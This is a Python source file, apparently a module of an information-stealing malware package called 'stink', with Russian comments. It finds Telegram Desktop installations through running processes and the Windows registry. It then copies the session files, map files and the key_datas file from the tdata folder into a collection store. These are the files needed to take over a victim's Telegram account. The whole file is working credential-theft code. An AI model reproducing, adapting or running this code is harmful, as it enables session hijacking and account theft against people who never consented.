import os
import re
import psutil
from typing import Optional
from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER

from stink.helpers import MemoryStorage
from stink.helpers.config import TelegramConfig
from stink.helpers.dataclasses import Data


class Telegram:
    """
    Collects sessions from the Telegram.
    """

    def __init__(self, folder: str):
        self.__folder = folder
        self.__config = TelegramConfig()
        self.__storage = MemoryStorage()

    def __get_telegram_path_from_processes(self):
        """
        Attempts to find the Telegram installation path by checking running processes.

        Returns:
        - List of paths to Telegram installation directories.
        """
        paths = []
        telegram_processes = [proc for proc in psutil.process_iter(['pid', 'name', 'exe']) if
                              proc.info['name'].lower() == "telegram.exe"]

        for index, process in enumerate(telegram_processes):
            try:
                # Получаем путь к исполняемому файлу
                exe_path = process.info['exe']
                # Берем папку, в которой находится исполняемый файл
                telegram_path = os.path.dirname(exe_path)
                paths.append(telegram_path)
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                continue

        return paths

    def __get_telegram_path_from_registry(self) -> Optional[str]:
        """
        Gets the Telegram installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Telegram installation path if found.
        """
        if os.path.exists(self.__config.SessionsPath):
            return self.__config.SessionsPath

        try:
            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")

            for i in range(QueryInfoKey(key)[0]):
                subkey_name = EnumKey(key, i)
                subkey = OpenKey(key, subkey_name)

                try:
                    display_name = QueryValueEx(subkey, "DisplayName")[0]

                    if "Telegram" not in display_name:
                        continue

                    return QueryValueEx(subkey, "InstallLocation")[0]
                except FileNotFoundError:
                    pass
        except Exception as e:
            print(f"[Telegram]: {repr(e)}")

        return None

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.

        Parameters:
        - None.

        Returns:
        - None.
        """
        # Сначала пытаемся найти путь через запущенные процессы
        telegram_paths = self.__get_telegram_path_from_processes()

        if not telegram_paths:
            # Если процессы не найдены, пробуем найти через реестр
            telegram_path = self.__get_telegram_path_from_registry()
            if telegram_path:
                telegram_paths = [telegram_path]
            else:
                print(f"[Telegram]: No Telegram installation found")
                return

        session_prefixes = [
            "D877F783D5D3EF8C",
            "A7FDF864FBC10B77",
            "C2B05980D9127787",
            "F8806DD0C461824F"
        ]

        # Проходим по каждому найденному пути и сохраняем сессии
        for index, telegram_path in enumerate(telegram_paths):
            telegram_data = os.path.join(telegram_path, "tdata")
            if not os.path.exists(telegram_data):
                print(f"[Telegram]: tdata folder not found in {telegram_path}")
                continue

            sessions = []
            for prefix in session_prefixes:
                sessions += sum([re.findall(rf"{prefix}.*", file) for file in os.listdir(telegram_data)], [])

            if not sessions:
                print(f"[Telegram]: No sessions found in {telegram_data}")
                continue

            # Удаляем главную сессию, если она существует
            if "D877F783D5D3EF8C" in sessions:
                sessions.remove("D877F783D5D3EF8C")

            # Создаем папку для каждой найденной установки Telegram (telegram1, telegram2 и т.д.)
            target_folder = os.path.join(self.__folder, f"telegram{index + 1}")
            os.makedirs(target_folder, exist_ok=True)

            for session in sessions:
                session_path = os.path.join(telegram_data, session)
                target_session_path = os.path.join(target_folder, session)

                self.__storage.add_from_disk(session_path, target_session_path)

            # Для D877F783D5D3EF8C ищем карты и копируем их
            d877f_path = os.path.join(telegram_data, "D877F783D5D3EF8C")
            if os.path.exists(d877f_path):
                maps = [file for file in os.listdir(d877f_path) if re.findall(r"map.*", file)]
                for map_file in maps:
                    map_source = os.path.join(d877f_path, map_file)
                    map_target = os.path.join(target_folder, "D877F783D5D3EF8C", map_file)

                    self.__storage.add_from_disk(map_source, map_target)

            # Копируем ключевые данные сессий
            key_data_path = os.path.join(telegram_data, "key_datas")
            if os.path.exists(key_data_path):
                self.__storage.add_from_disk(key_data_path, os.path.join(target_folder, "key_datas"))

            self.__storage.add_data("Application", "Telegram")

    def run(self) -> Data:
        """
        Launches the Telegram collection module.

        Parameters:
        - None.

        Returns:
        - Data: Collected session data.
        """
        try:
            self.__get_sessions()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Telegram]: {repr(e)}")
